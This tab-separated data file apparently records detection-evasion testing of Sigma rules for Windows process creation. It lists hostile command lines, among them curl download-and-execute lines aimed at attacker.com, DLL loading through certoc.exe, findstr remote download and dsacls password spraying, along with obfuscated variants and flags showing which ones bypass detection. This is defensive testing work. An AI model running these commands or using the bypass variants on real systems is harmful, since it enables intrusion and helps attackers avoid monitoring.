Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1560.001	proc_creation_win_rar_compression_with_password	Rar Usage with Password and Compression Level	faa48cae-6b25-4f00-a094-08947fef582f		rar.exe a -hpSecret\ -m5 archive.rar C:\temp\sensitive_data.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe -AddInRoot:C:\\Users\\Public\\Payload	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe /AddInRoot:C:\\Users\\Public\\Payload	FALSE	FALSE	FALSE	
t1218	proc_creation_win_addinutil_uncommon_cmdline	Uncommon AddinUtil.EXE CommandLine Execution	4f2cd9b6-4a17-440f-bb2a-687abb65993a		AddInUtil.exe -AddInRoot:C:\\Users\\Public\\Payload\	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		"copy powershell.exe AgentExecutor.exe && AgentExecutor.exe -Command ""Write-Output 'Bypassed'"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_agentexecutor_potential_abuse	AgentExecutor PowerShell Execution	7efd2c8d-8b18-45b7-947d-adfe9ed04f61		AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -LoadDLL malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		"certoc.exe -loaddll"" malicious.dll"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll  malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe ^-loaddll malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll .\malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll C:\Windows\System32\malicious.dll	FALSE	FALSE	FALSE	
t1218	proc_creation_win_certoc_load_dll	DLL Loaded via CertOC.EXE	242301bc-f92f-4476-8718-78004a6efd9f		certoc.exe -loaddll malicious	FALSE	FALSE	FALSE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & .\payload.exe	TRUE	TRUE	TRUE	
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		cmd.exe /c curl http://example.com/payload.exe > payload.exe & payload.exe	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		"powershell.exe -Command ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl --url http://attacker.com/script.bat --out script.bat && script.bat"""	curl --url http://attacker.com/script.bat --out script.bat && script.bat	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288		curl -s http://attacker.com/payload.ps1 --output payload.ps1 ; powershell -ExecutionPolicy Bypass -File payload.ps1	TRUE	TRUE	FALSE	Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl -sL http://attacker.com/payload.exe -O && payload.exe"""	curl -sL http://attacker.com/payload.exe -O && payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl http://attacker.com/payload.exe -o payload.exe && payload.exe"""	curl http://attacker.com/payload.exe -o payload.exe && payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl http://attacker.com/payload.exe -o payload.exe & .\payload.exe"""	curl http://attacker.com/payload.exe -o payload.exe & .\payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl http://attacker.com/payload.exe -o payload.exe & payload.exe"""	curl http://attacker.com/payload.exe -o payload.exe & payload.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmd_curl_download_exec_combo	Curl Download And Execute Combination	21dd6d38-2b18-4453-9404-a0fe4a0cc288	"cmd.exe /c ""curl http://attacker.com/payload.exe -o p.exe & p.exe"""	curl http://attacker.com/payload.exe -o p.exe & p.exe	TRUE	FALSE	FALSE	Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337	"cmdl32.exe  \""/vpn\"" \""/lan\"" C:\path\to\config.txt"	"cmdl32.exe ""/vpn"" ""/lan"" C:\path\to\config.txt"	TRUE	FALSE	FALSE	Potential Arbitrary File Download Via Cmdl32.EXE (f37aba28-a9e6-4045-882c-d5004043b337)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		cmdl32.exe -vpn -lan C:\path\to\config.txt	TRUE	TRUE	TRUE	
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337	cmdl32.exe  /lan /vpn C:\path\to\config.txt	cmdl32.exe /lan /vpn C:\path\to\config.txt	TRUE	FALSE	FALSE	Potential Arbitrary File Download Via Cmdl32.EXE (f37aba28-a9e6-4045-882c-d5004043b337)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337	cmdl32.exe  /vpn /lan C:\path\to\config.txt	cmdl32.exe /vpn /lan C:\path\to\config.txt	TRUE	FALSE	FALSE	Potential Arbitrary File Download Via Cmdl32.EXE (f37aba28-a9e6-4045-882c-d5004043b337)
t1218	proc_creation_win_cmdl32_arbitrary_file_download	Potential Arbitrary File Download Via Cmdl32.EXE	f37aba28-a9e6-4045-882c-d5004043b337		copy cmdl32.exe not_an_exploit.exe && not_an_exploit.exe /vpn /lan C:\path\to\config.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		"diskshadow.exe -s ""C:\temp\payload.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -s C:\temp\payload   .txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe /s C:\temp\payload.`txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_ext	Diskshadow Script Mode - Uncommon Script Extension Execution	1dde5376-a648-492e-9e54-4241dd9b0c7f		diskshadow.exe -s C:\temp\payload.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe -s C:\Users\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\..\Public\script.txt	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		"diskshadow.exe /s ""C:\Users\Public\script.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		set SCRIPT_PATH=C:\Users\Public\script.txt && diskshadow.exe /s %SCRIPT_PATH%	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		diskshadow.exe /s C:\Users\Public\script.txt && echo dummy	FALSE	FALSE	FALSE	
t1218	proc_creation_win_diskshadow_script_mode_susp_location	Diskshadow Script Mode - Execution From Potential Suspicious Location	fa1a7e52-3d02-435b-81b8-00da14dd66c1		"diskshadow.exe /s C:\Users\Public\script.txt | findstr /v """""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dotnet_trace_lolbin_execution	Binary Proxy Execution Via Dotnet-Trace.EXE	9257c05b-4a4a-48e5-a670-b7b073cf401b		dotnet-trace collect -- calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /U:admin /P:Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /user:admin /passwd:Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		"dsacls.exe /user:admin ""/passwd:Password123"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		set P=/passwd: && dsacls.exe /user:admin %P%Password123	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dsacls_password_spray	Potential Password Spraying Attempt Using Dsacls.EXE	bac9fb54-2da7-44e9-988f-11e9a5edbc0c		dsacls.exe /user:admin /passwd:Password123 /	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc .exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -v	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -	FALSE	FALSE	FALSE	
t1218	proc_creation_win_dxcap_arbitrary_binary_execution	New Capture Session Launched Via DXCap.EXE	60f16a96-db70-42eb-8f76-16763e333590		DXCap.exe -c calc.exe -v -c notepad.exe	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	expand.exe  /F:* C:\Users\Public\test.cab C:\Windows\Temp\\	expand.exe /F:* C:\Users\Public\test.cab C:\Windows\Temp\	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	expand.exe  -F:* C:\Windows\Temp\test.cab C:\Users\Administrator\AppData\Local\Temp\\	expand.exe -F:* C:\Windows\Temp\test.cab C:\Users\Administrator\AppData\Local\Temp\	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	expand.exe  /F:* C:\AppData\Roaming\test.cab C:\Windows\System32\\	expand.exe /F:* C:\AppData\Roaming\test.cab C:\Windows\System32\	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	expand.exe  -F:* C:\C$\test.cab C:\Windows\Temp\\	expand.exe -F:* C:\C$\test.cab C:\Windows\Temp\	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr /v /l . \""\\192.168.1.100\share\payload.txt\"""""	"findstr /v /l . ""\\192.168.1.100\share\payload.txt"""	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192\.168\.1\.100\share\payload.txt\"""""	"findstr -v -l . ""\\192\.168\.1\.100\share\payload.txt"""	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" > NUL"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" > NUL"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" | findstr ."""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" | findstr ."	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" && echo Done"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" && echo Done"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" ^| more"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^| more"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" ^>^> NUL"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^>^> NUL"	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" ^< NUL"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^< NUL"	TRUE	FALSE	FALSE	Read Contents From Stdin Via Cmd.EXE (241e802a-b65e-484f-88cd-c2dc10f9206d); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" ^<^> NUL"""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^<^> NUL"	TRUE	FALSE	FALSE	Read Contents From Stdin Via Cmd.EXE (241e802a-b65e-484f-88cd-c2dc10f9206d); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
t1218	proc_creation_win_findstr_download	Remote File Download Via Findstr.EXE	587254ee-a24b-4335-b3cd-065c0f1f4baa	"cmd.exe /c ""findstr -v -l . \""\\192.168.1.100\share\payload.txt\"" ^| findstr /m ."""	"findstr -v -l . ""\\192.168.1.100\share\payload.txt"" ^| findstr /m ."	TRUE	FALSE	FALSE	Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa); Remote File Download Via Findstr.EXE (587254ee-a24b-4335-b3cd-065c0f1f4baa)
